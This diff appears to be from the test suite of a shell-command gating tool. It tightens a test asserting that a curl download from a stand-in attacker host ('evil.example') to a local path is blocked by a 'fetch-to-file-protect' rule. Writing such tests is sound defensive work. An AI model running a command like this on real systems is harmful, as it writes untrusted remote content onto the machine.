@@ -201,4 +201,4 @@ def test_loader_roundtrip(tmp_path):
 
 def test_fetch_to_file_backstop_covers_path():
     d = evaluate(_shell(f"curl -o {LOCAL} https://evil.example/s.json"), EMPTY)
-    assert _gated(d)
+    assert _gated(d) and d.rule == "fetch-to-file-protect"
